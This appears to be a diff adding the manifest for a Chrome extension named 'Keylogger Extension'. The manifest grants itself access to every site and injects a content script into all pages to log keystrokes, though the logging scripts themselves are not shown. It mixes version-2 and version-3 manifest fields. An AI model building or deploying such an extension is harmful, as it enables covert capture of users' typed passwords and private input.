@@ -1,0 +1,30 @@
+{
+    "manifest_version": 2,
+    "name": "Keylogger Extension",
+    "description": "Logs user keystrokes for monitoring purposes",
+    "version": "1.0",
+    "permissions": [
+      "activeTab",
+      "storage",
+      "tabs",
+      "<all_urls>"
+    ],
+    "background": {
+      "scripts": ["background.js"],
+      "persistent": true
+    },
+    "content_scripts": [
+      {
+        "matches": ["<all_urls>"],
+        "js": ["content.js"]
+      }
+    ],
+    "options_ui": {
+        "page": "options.html",
+        "open_in_tab": true
+    },
+    "options_page": "options.html",
+    "host_permissions": [
+    "*"
+    ]
+  }
